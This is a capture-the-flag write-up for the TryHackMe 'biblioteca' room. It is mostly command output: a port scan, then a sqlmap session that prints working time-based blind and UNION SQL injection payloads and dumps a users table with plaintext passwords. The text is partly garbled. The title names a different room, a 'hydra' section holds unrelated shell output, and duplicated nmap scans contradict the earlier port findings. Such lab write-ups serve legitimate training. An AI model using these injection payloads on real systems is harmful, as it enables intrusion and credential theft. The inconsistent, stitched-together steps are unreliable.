<h1 align="center">Madeye´s Castle<br><img width="1200px" src=""></h1>
<p align="center">June 19, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>408</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Shhh. Be very very quiet, no shouting inside the biblioteca.</em><br>
Click <a href="https://tryhackme.com/room/biblioteca">here </a>to access the "room".<br>
<img width="80px" src="https://github.com/user-attachments/assets/f170bd8a-211c-41fe-9ea2-d3806ed5b421"><br></p>

<h2> Task 1 . What is the user and root flag?</h2>
<p>Hit 'em with the classics.br>

<h4 align="left"> Answer the questions below</h4>

> 1.1. <em>What is the user flag?</em> Hint : <em>Weak password</em><br><a id='1.1'></a>
>> <strong><code>__________</code></strong><br>
<p></p>



<h3>rustscan</h3>

```bash
:~# rustscan -a TargetIP --ulimit 4400 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
...
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    syn-ack Werkzeug httpd 2.0.2 (Python 3.8.10)
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
|_http-title:  Login 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...
```

![image](https://github.com/user-attachments/assets/c953dd68-1137-4fc6-acf6-dc022a27f459)

![image](https://github.com/user-attachments/assets/1884d81f-d6a1-4297-8514-277a1cb1f197)

<br>

![image](https://github.com/user-attachments/assets/126db0da-7cae-4817-a6f9-e0fbfe56184a)

![image](https://github.com/user-attachments/assets/4ec7d6e5-1416-4522-bcdf-0509d5a4fc18)

<h3>Registration</h3>
<p>researcher : password : researcher@m.com</p>

![image](https://github.com/user-attachments/assets/163a19d7-31e1-474c-86d6-8611111d72a8)

<h3>Login</h3>

![image](https://github.com/user-attachments/assets/34f06b2e-aba2-4708-ad85-0f06469eb900)

![image](https://github.com/user-attachments/assets/96515245-50c4-4f83-b37c-b15c4560e438)


<h3>sqlmap</h3>

```bash
:~# sqlmap -u 'http:/TargetI`P:8000/login' --form --batch --dump
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.4#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

...
[INFO] searching for forms
[#1] form:
POST http://TargetIP:8000/login
POST data: username=&password=
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: username=&password=] (Warning: blank fields detected): username=&password=
...
[INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
...
[INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[INFO] target URL appears to have 4 columns in query
[INFO] POST parameter 'username' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 61 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=RRZT' AND (SELECT 4623 FROM (SELECT(SLEEP(5)))EGuR) AND 'lCOj'='lCOj&password=

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: username=RRZT' UNION ALL SELECT NULL,CONCAT(0x716a716a71,0x46574664504e437a77537556706d6750666f4e786d4b57764c537045774f63784e594c794f6b584f,0x716a6a6b71),NULL,NULL-- -&password=
---
do you want to exploit this SQL injection? [Y/n] Y
[INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
...
[INFO] retrieved: 'id','int'
[INFO] retrieved: 'username','varchar(255)'
[INFO] retrieved: 'password','varchar(255)'
[INFO] retrieved: 'email','varchar(100)'
[INFO] fetching entries for table 'users' in database 'website'                                               
[INFO] retrieved: '1','My_P@ssW0rd123','smokey@email.boop','smokey'
[INFO] retrieved: '2','password','researcher@m.com','researcher'
Database: website                                                                                                        
Table: users
[2 entries]
+------+-------------------+------------+----------------+
| id   | email             | username   | password       |
+------+-------------------+------------+----------------+
| 1    | smokey@email.boop | smokey     | My_P@ssW0rd123 |
| 2    | researcher@m.com  | researcher | password       |
+------+-------------------+------------+----------------+
...
```

![image](https://github.com/user-attachments/assets/d556c288-0d78-4195-a46d-03902bb0ee49)

![image](https://github.com/user-attachments/assets/b1ab31ee-5033-4992-81fb-a4f557cab02f)


<h3>hydra</h3>

```bash
smokey@ip-10-10-229-62:/home$ ls
hazel  smokey  ubuntu
smokey@ip-10-10-229-62:/home$ 
80/tcp open  http
```



```bash
:~# nmap -Pn -p- TargetIP
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```


```bash
:~# nmap -Pn -p- TargetIP
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
